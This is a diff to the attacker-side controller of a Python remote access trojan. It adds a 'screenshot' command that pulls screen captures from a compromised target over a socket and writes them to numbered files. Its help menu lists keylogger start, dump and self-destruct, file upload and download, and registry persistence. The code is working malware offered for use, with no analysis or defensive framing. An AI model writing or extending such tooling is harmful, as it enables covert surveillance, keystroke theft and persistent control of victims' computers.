@@ -35,6 +35,7 @@ def download_file(file_name):
 	f.close()
 
 def target_communication():
+	count = 0
 	while True:
 		command = input(f"* Shell~{ip}: ").lower()
 		send_data(command)
@@ -48,6 +49,18 @@ def target_communication():
 			upload_file(command[7:])
 		elif command[:8] == "download":
 			download_file(command[9:])
+		elif command[:10] == "screenshot":
+			f = open("screenots%d" % (count), 'wb')
+			target.settimeout(3)
+			chunk = target.recv(1024) 
+			while True:
+				f.write(chunk)
+				try:
+					chunk = target.recv(1024) 
+				except socket.timeout as e:
+					break
+			target.settimeout(None)
+			f.close()
 		elif command == "help":
 			            print(colored('''\n
             quit                                --> Quit Session With The Target
@@ -58,7 +71,7 @@ def target_communication():
             keylog_start                        --> Start The Keylogger
             keylog_dump                         --> Print Keystrokes That The Target Inputted
             keylog_stop                         --> Stop And Self Destruct Keylogger File
-            persistence *RegName* *fileName*    --> Create Persistence In Registry''','yellow'))
+            persistence *RegName* *fileName*    --> Create Persistence In Registry\n''','yellow'))
 		else:
 			result = recv_data()
 			print(f"\n {result}")
